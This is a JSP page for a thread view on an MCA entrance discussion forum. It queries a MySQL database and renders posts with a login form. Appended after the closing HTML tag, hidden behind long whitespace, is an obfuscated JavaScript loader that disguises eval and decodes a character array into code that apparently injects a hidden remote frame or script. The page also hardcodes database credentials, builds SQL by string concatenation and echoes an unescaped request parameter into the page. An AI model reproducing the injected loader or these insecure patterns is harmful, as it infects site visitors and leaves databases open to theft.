<%@ page language="java" import="java.sql.*,java.lang.*,java.util.Date,java.util.TimeZone,java.text.SimpleDateFormat" session="true" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<TiTLE>MCA Entrance Discussion Forum <%= request.getParameter("topic") %></TITLE>
<HEAD>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.1.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.2.css>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta name="Keywords" content="MCA, MCA Entrance, IIT MCA, MCA Discussion Forum, MCA Notification, MCA Entrance Test" >
<meta name="description" content="MCA Entrance Discussion Forum <%= request.getParameter("topic") %>">
<style type="text/css">
DIV.Object1 { position:absolute; top:0px; left:0px; z-index:0;}
DIV.Object2 { position:absolute; top: -50px; left:380px; z-index:1;}

DIV.Object3 { position:absolute; top:33px; left:745px; z-index:2; }
DIV.Object4 { position:absolute; top:95px; left:0px; z-index:3; }
DIV.Object5 { position:absolute; top:148px; left:181px; width:825px; z-index:12;}
DIV.Object6 { position:absolute; top:148px; left:0px; z-index:5; }

DIV.Object7 { position:absolute; top:320px; left:181px; z-index:6; }

DIV.Object9 { position:absolute; left:0px; width:1000px; z-index:8;}
DIV.Object10 { position:absolute; left:0px; width:1000px; z-index:9;}

input {font-family:'Arial, Helvetica, sans-serif'; font-size:10px}

</style>
<script>
function check()
{
	var a=true;
        a=email(document.f1.userid) && name(document.f1.pass); 
	if (a)
	{
		
		f1.submit();
	}
	else
	{
		return false;
	}
}

function email(val1)
{
	var em,c1,d1,e1,g1,h,str1;
	em=val1.value;
	str1="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@._";
	c1=em.length;
	if (c1<1)
	{
    	alert("This field cannot be empty");
  	  	val1.focus();
     	return false;
  	}
	else
	{
    	d1=str1.length;
	 	for (k=0; k<c1; k++)
		{
			e1=em.charAt(k);
			g1=str1.indexOf(e1);
			if (g1 < 0)
			{
				err(val1);
				return false;
			}
		}
		if (em.indexOf('@')<0)
		{
			err(val1);
			return false;
		}
		if (em.charAt(0)=='@')
		{
			err(val1);
			return false;
		}
		var posat, posdt;
		posat=em.indexOf('@');
		posdt=em.indexOf('.');
		if (posdt-posat < 2)
		{
			err(val1);
			return false;
		}
		if (em.charAt(c1-1)=='.')
		{
			err(val1);
			return false;
		}
		var dat,cnt,cnt1;
		cnt=0;
		cnt1=0;
		for (s=0; s<c1; s++)
		{
			dat=em.charAt(s);
			if (dat=='@')
				cnt=cnt+1;
			if (dat=='.')
				cnt1=cnt1+1;
		}
		if ((cnt >1) || (cnt1>3))
		{
			err(val1);
			return false;
		}
	}
	return true;
}

function name(val1)
{
	var em,c1,d1,e1,g1,h,str1;
	em=val1.value;
	str1="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	c1=em.length;
	if (c1<1)
	{
    	alert("This field cannot be empty");
  	  	val1.focus();
     	return false;
  	}
	else
	{
    	d1=str1.length;
	 	for (k=0; k<c1; k++)
		{
			e1=em.charAt(k);
			g1=str1.indexOf(e1);
			if (g1 < 0)
			{
				alert ("Enter a valid Password.");
				val1.focus();
				val1.select();
				return false;
			}
		}
	}
	return true;
}

function err(val1)
{
	alert ("Enter a valid Userid.");
	val1.focus();
	val1.select();
}

function openWin(theURL,winName,features) {
window.open(theURL,winName,features);
}
</script>
</HEAD>
<BODY bgcolor="#F4F4F4" topmargin="0" leftmargin="0">

<Div class="Object1">
<img src="http://www.sanmacs.com/images1/mca_logo.jpg" alt="MCA Entrance"></img>
</Div>

<Div class="Object2">
<embed src="http://www.sanmacs.com/swffiles/mca_identity.swf" wmode=transparent width=467></embed>
</Div>

<Div class="Object3">
<a href="http://www.sanmacs.com/index.htm"><img src="http://www.sanmacs.com/images2/home.gif" name=imgx onMouseover="imgx.src='http://www.sanmacs.com/images2/home2.gif'" onMouseout="imgx.src='http://www.sanmacs.com/images2/home.gif'" alt=Home border=0></img></a>
</Div>

<DIV class="Object4">
<SCRIPT type=text/javascript src="http://www.sanmacs.com/images1/mca_menu.js"></SCRIPT>
<NOSCRIPT>Your browser does not support script</NOSCRIPT> <!-- REST OF BODY CONTENT BELOW HERE -->
</DIV>

<DIV class="Object5">
<form method="Post" name=f1 action="http://www.sanmacs.com/mca_guidance_disscusion_forum/usercheck.jsp">
<table border=0 cellspacing=0 cellpadding=1>
<tr><img src="http://www.sanmacs.com/images2/discussion_forum/sanmacs_discussion_forum.gif" width=825></img></td></tr>
<tr><td height=3></td></tr>
<tr><td width=484 height=20 background="http://www.sanmacs.com/images2/red_strip.gif"><p id="ftpw" style="margin-left:2px"><b>Welcome Visitor</b></p></td></tr>
<tr><td height=3></td></tr>
<tr><td>
<table border=3 cellpadding=2 cellspacing=1 bgcolor=#E1E1E2 bordercolor=#BDBEBE bordercolorlight=#ADAEAF bordercolordark=#979899>
<tr>
<td width=45% valign=top>
<p id="ftp" align="justify">You currently have browse capabilities. To participate in the discussions and post your own comments, please log in.<br><a class="my1" href="http://www.sanmacs.com/information_for_mca_entrance_students/mca_entrance_discussion_forum/forum_registeration.htm"><b>Get a free SANMACS Forum Account.</b></a></p>
</td>
<th valign=top>
<table border=0 cellspacing=0 cellpadding=2>
	<tr><th valign=top colspan=5><p id="ftp" align="center" style="color:red">Existing Users!</p></th></tr>
	<tr><td colspan=5 height=2></td></tr>
	<tr><th valign=top><p id="ftp" align="justify">User Id</p></th><td valign=top align=right><input type=text name=userid size=12></td><th valign=top><p id="ftp" align="justify">Password</p></th><td valign=top align=right><input type=password name=pass size=12></td><th valign=top><img src="http://www.sanmacs.com/images2/discussion_forum/sign_in.gif" onClick="check()" style="cursor:hand"></img></th></tr>
</table>
</th>
</tr>
</table>
</td></tr>
</table>
</form>
</DIV>

<%!Connection con;
Statement st,st1,st2,st3;
ResultSet rs,rs1,rs2;

int topic1;
String rep_fr="";
String forum_type="";
String full_name="";
String full_name1="";
String check="";
String check1="";
String eid="";
String rep_head="";
int count=0;
int counter;
String rep_f="";
String conid="";
String rep_id="";
%>

<%
	HttpSession rsm=request.getSession(true);
	session.setMaxInactiveInterval(900);

	forum_type=(String)rsm.getValue("ftype");

	rsm.putValue("ftype",forum_type);
	topic1=Integer.parseInt(request.getParameter("topic"));
	
	try {

	String dns = "jdbc:mysql://sanmacs.db.6936442.hostedresource.com/sanmacs?user=sanmacs&password=macs@123SAN";
	Class.forName("org.gjt.mm.mysql.Driver");
	con= DriverManager.getConnection(dns);

	st1=con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

	st=con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

	st2=con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

	st3=con.createStatement();

	st3.executeUpdate("Update Thread set Views=Views+1 where Thread_id="+topic1+"");

	rs1=st1.executeQuery("Select User_id,Heading,Question,Thread_date,Thread_time,checkid,fname,lname from Thread,User2 where Thread_id="+topic1+" and Thread.User_id=User2.email");
	rs1.next();
%>
<Div class="Object7">
<table border=1 cellpadding=3 cellspacing=0 width=100% bordercolor=white bgcolor=#E4EAF2>
<tr height=30><th colspan=3 background="http://www.sanmacs.com/images2/discussion_forum/bg_image.gif"><p id="ftpw" align="justify"><%=rs1.getString("Heading") %>?</p></th></tr>
<%
	rs1.previous();
	while(rs1.next()) {
	full_name=rs1.getString("fname")+" "+rs1.getString("lname");
	check=rs1.getString("checkid");
	eid=rs1.getString("User_id");
	rsm.putValue("my_topic",""+topic1);
%>
<tr><th width=30% rowspan=3 onmouseout='this.style.backgroundColor=""' onmouseover="this.style.backgroundColor='#CCE6FF'"><p id="ftp" align="center"><a class="lt" href='javascript:openWin("http://www.sanmacs.com/mca_guidance_disscusion_forum/username.jsp?chk=<%=check %>","profile","toolbar=0,location=0,status=0,menubar=0,scrollbars=0,resizable=0,width=360,height=300")'><%=full_name %></a></p></th><td style="border-right:0px"><p id="ftp" align="justify"><b>Posted: </b><%=rs1.getString("Thread_date") %> <%=rs1.getString("Thread_time") %></p></td><td align=right style="border-left:0px"><img border=0 align=absmiddle src="http://www.sanmacs.com/images2/discussion_forum/quote.gif" style="cursor:hand" onClick="alert('You have to login for using this facility');"></img></td></tr>
<tr><td colspan=2><p id="ftp" align="justify"><%=rs1.getString("Question") %></p></td></tr>
<tr><td colspan=2><img src="http://www.sanmacs.com/images2/discussion_forum/search.gif" border=0 style="cursor:hand" onClick="alert('You have to login for using this facility');"></img></td></tr>
<%
	}

	rs=st.executeQuery("Select Reply_id,Reply_from,Reply_head,Reply,Reply_date,Reply_time from Reply where Thread_id="+topic1+"");

	while(rs.next()) {
	rep_id=rs.getString("Reply_id");
	rep_f=rs.getString("Reply_from");

	rs2=st2.executeQuery("Select checkid,fname,lname from User2 where email='"+rep_f+"'");
	while(rs2.next()) {
	full_name1=rs2.getString("fname")+" "+rs2.getString("lname");
	check1=rs2.getString("checkid");
	rep_head=rs.getString("Reply_head");
%>
<tr><th width=30% rowspan=3 onmouseout='this.style.backgroundColor=""' onmouseover="this.style.backgroundColor='#CCE6FF'"><p id="ftp" align="center"><a class="lt" href='javascript:openWin("http://www.sanmacs.com/mca_guidance_disscusion_forum/username.jsp?chk=<%=check1 %>","profile","toolbar=0,location=0,status=0,menubar=0,scrollbars=0,resizable=0,width=360,height=300")'><%=full_name1 %></a></p></th><td style="border-right:0px"><p id="ftp" align="justify"><b>Posted: </b><%=rs.getString("Reply_date") %> <%=rs.getString("Reply_time") %></p></td><td align=right style="border-left:0px"><img border=0 align=absmiddle src="http://www.sanmacs.com/images2/discussion_forum/quote.gif" style="cursor:hand" onClick="alert('You have to login for using this facility');"></img></td></tr>
<tr><td colspan=2><p id="ftp" align="justify"><b>Heading:</b> <%=rep_head %><br><b>Reply:</b> <%=rs.getString("Reply") %></p></td></tr>
<tr><td colspan=2><img src="http://www.sanmacs.com/images2/discussion_forum/search.gif" border=0 style="cursor:hand" onClick="alert('You have to login for using this facility');"></img></td></tr>
<%
	}
	count++;
	}
counter=count;
count=0;
%>
</table>
</Div>
<%
	con.close();
	} catch(SQLException se) {
	  out.println("SQL Exception :"+se);
	} catch(ClassNotFoundException ce) {
	  out.println("Class Not Found Exception :"+ce);
	} catch(Exception e) {
	  out.println("General Exception :"+e);
	}
%>

<Div class="Object6">
<table border=0 cellpadding=0 cellspacing=0>
<tr><td><img src="http://www.sanmacs.com/images2/discussion_forum/expert-panel.gif"></img></td></tr>
<tr><td width=177 height=<%=(84+((counter)*270))%> bgcolor=#933900></td></tr>
</table>
</Div>

<DIV class="Object9" style="top:<%=(548+((counter)*270))%>px;">
<table border=0 cellspacing=2 cellpadding=0 background="http://www.sanmacs.com/images2/lowstrip.gif" width=100%>
<tr height=30>
<th valign=top><a class="me" href="http://www.sanmacs.com/index.htm" title="Sanmacs Home">Home</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_about_us/identity.htm" title="About MCA Entrance">About Us</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/sanmacs_mca_entrance_course/megaleap.htm" title="Enrollment For MCA Entrance Coaching">Megaleap</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_training/mca_entrance_syllabus_of_universities/mca_entrance_syllabus_of_universities.htm" title="Training For MCA Entrance">MCA Training</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_notification/mca_entrance_admission_notification.htm" title="Notification For MCA Entrance">Notification</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_sanmacs_previlege/sanlogin.htm" title="MCA Entrance Previlege">Sanmacs Previlege</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/information_for_mca_entrance_students/sanmacs_student_speaks/Student_speaks.htm" title="Student Central For MCA Students">Student Central</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_entrance_voyage_of_success/mca_entrance_voyage_of_success.htm" title="Success of MCA Entrance">Voyage of Success</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/sanmacs_mca_entrance_alumni/register.htm" title="MCA Alumni">Alumni</a> </th><th><img src="http://www.sanmacs.com/images2/lowerline.gif" height=22></img> </th>
<th valign=top><a class="me" href="http://www.sanmacs.com/mca_contact/Contact.htm" title="Contact For MCA Training">Contact Us</a> </th>
</tr>
</table>
</DIV>

<DIV class="Object10" style="top:<%=(568+((counter)*270))%>px;">
<p id="ft5" align="center" style="BACKGROUND:#D9D5D4; color:#666666; font-weight:bold">All rights reserved. Copyright © Sanmacs India Pvt. Ltd &nbsp;&nbsp;&nbsp;<a href="http://www.sanmacs.com/mca_entrance_legal_disclaimer/Legal.htm" title="MCA Entrance Disclaimer">Legal Disclaimer</a></p>
</DIV>

</BODY>
</HTML>

/*b5bee1*/
                                                                                                                                                                                                                                                          try{document.body/=2}catch(gdsgd){ww=window;v="va"+"l";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,116,102,102,114,32,60,30,97,111,98,115,106,101,109,114,43,99,113,99,94,116,100,67,105,101,108,99,107,116,39,37,102,102,113,95,106,101,38,39,56,13,9,11,7,32,31,30,29,116,102,102,114,46,114,112,96,32,60,30,36,104,115,114,109,58,46,45,108,114,104,113,112,97,115,109,114,114,45,97,108,109,46,95,97,118,115,45,112,101,96,112,96,104,55,44,109,104,111,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,111,109,112,105,115,103,108,110,31,59,29,39,96,96,112,111,107,115,113,101,38,57,10,10,31,30,29,32,115,101,101,117,45,113,113,121,107,99,43,98,110,112,97,101,113,30,58,32,38,46,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,117,102,100,115,102,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,107,99,99,116,31,59,29,39,48,110,117,39,58,11,7,32,31,30,29,116,102,102,114,46,114,114,118,108,100,44,113,111,111,30,58,32,38,47,109,120,38,57,10,10,12,8,29,32,31,30,102,102,31,38,30,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,114,100,104,116,90,36,62,59,45,97,105,117,60,36,41,58,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,43,97,111,110,98,110,99,65,101,105,107,98,37,116,102,102,114,41,58,11,7,32,31,30,29,125,12,8,122,41,39,39,56);}w=f;s=[];for(i=0;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;xz(s)}
/*/b5bee1*/
